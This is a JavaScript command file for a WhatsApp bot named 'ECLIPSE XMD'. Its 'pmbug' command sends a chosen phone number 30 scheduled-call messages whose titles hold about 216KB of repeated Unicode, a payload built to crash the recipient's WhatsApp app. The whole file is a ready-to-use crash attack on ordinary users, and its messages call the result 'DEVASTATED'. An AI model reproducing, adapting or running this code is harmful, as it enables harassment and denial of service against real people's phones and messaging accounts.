import config from '../../config.js';
import { generateWAMessageFromContent } from '@whiskeysockets/baileys';

const OWNER_NUMBER = config.ownerNumber.replace(/^\+/, '');
const OWNER_JID = `${OWNER_NUMBER}@s.whatsapp.net`;

const normalizeNumber = (number) => number.replace(/[^0-9]/g, '');
const isValidPhoneNumber = (number) => {
  const cleaned = normalizeNumber(number);
  return cleaned.length >= 10 && cleaned.length <= 15;
};

const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));

const XEONTEXT6 = `📱 𝐄𝐂𝐋𝐈𝐏𝐒𝐄 𝐗𝐌𝐃 ☠️` + "ﲄ؁࡙࡙࡙࡙࡙࡙࡙".repeat(15000) + "𞋬𞋬𞋬𞋬𞋬".repeat(10000);

export default {
  name: 'pmbug',
  description: '💀 MOST DANGEROUS: PM Bug - Scheduled call crash with massive payload',
  category: 'Bug/Crash',
  usage: `${config.prefix}pmbug <number>`,
  
  async execute(msg, { sock, args }) {
    const from = msg.key.remoteJid;
    const senderJid = msg.key.participant || msg.key.remoteJid;
    const senderNumber = senderJid.split('@')[0];

    console.log(`[PMBUG] Command triggered by ${senderJid}`);

    const normalizedSender = normalizeNumber(senderNumber);
    const normalizedOwner = normalizeNumber(OWNER_NUMBER);
    const isOwner = senderJid === OWNER_JID || normalizedSender === normalizedOwner;

    if (!isOwner) {
      console.log(`[PMBUG] Unauthorized access attempt`);
      await sock.sendMessage(from, {
        text: `🚫 *DENIED* - Owner-only command`
      }, { quoted: msg });
      return;
    }

    if (!args[0]) {
      await sock.sendMessage(from, {
        text: `💀 *PM BUG - MOST DANGEROUS*\n\n📋 Usage: ${config.prefix}pmbug <number>\n📝 Example: ${config.prefix}pmbug 1234567890\n\n⚠️ EXTREME WARNING:\n• This is the MOST DANGEROUS bug\n• Sends scheduled call crashes\n• Massive payload (216KB+)\n• Can permanently crash WhatsApp\n• USE WITH EXTREME CAUTION!\n\n🚨 Account ban risk is VERY HIGH!`
      }, { quoted: msg });
      return;
    }

    let client = msg.message?.extendedTextMessage?.contextInfo?.mentionedJid?.[0] || args[0];
    let clientNumber = client.includes('@s.whatsapp.net') ? client.split('@')[0] : normalizeNumber(client);

    if (!isValidPhoneNumber(clientNumber)) {
      await sock.sendMessage(from, {
        text: `❌ Invalid number. Must be 10-15 digits.`
      }, { quoted: msg });
      return;
    }

    const targetJid = client.includes('@s.whatsapp.net') ? client : `${clientNumber}@s.whatsapp.net`;

    try {
      await sock.sendMessage(from, { react: { text: '💀', key: msg.key } });

      await sock.sendMessage(from, {
        text: `💀 *PM BUG ATTACK INITIATED*\n\n🎯 Target: +${clientNumber}\n💣 Type: Scheduled Call Crash\n📦 Payload: 216KB+ Unicode\n⏳ Executing extreme attack...\n\n⚠️ This will likely crash their WhatsApp!`
      }, { quoted: msg });

      const amount = 30;
      for (let i = 0; i < amount; i++) {
        const scheduledCallCreationMessage = generateWAMessageFromContent(from, {
          scheduledCallCreationMessage: {
            callType: "2",
            scheduledTimestampMs: Date.now() + 86400000,
            title: XEONTEXT6
          }
        }, { userJid: from, quoted: msg });

        await sock.relayMessage(targetJid, scheduledCallCreationMessage.message, { 
          messageId: scheduledCallCreationMessage.key.id 
        });
        
        await sleep(3000);
        
        if (i % 5 === 0) {
          console.log(`[PMBUG] Progress: ${i + 1}/${amount}`);
        }
      }

      await sock.sendMessage(from, { react: { text: '✅', key: msg.key } });

      await sock.sendMessage(from, {
        text: `✅ *PM BUG COMPLETED*\n\n🎯 Target: +${clientNumber}\n💣 Payloads Sent: ${amount}x Scheduled Calls\n📦 Total Data: ~6.5MB\n📊 Status: DEVASTATED\n⚠️ CRITICAL: Wait 5+ minutes before next attack\n\n💀 ECLIPSE XMD - EXTREME MODE`
      }, { quoted: msg });

      console.log(`[PMBUG] Extreme attack completed on ${clientNumber}`);
    } catch (e) {
      console.log(`[PMBUG] Error: ${e.message}`);
      await sock.sendMessage(from, {
        text: `❌ *ATTACK FAILED*\n\nTarget: +${clientNumber}\nError: ${e.message}`
      }, { quoted: msg });
    }
  }
};
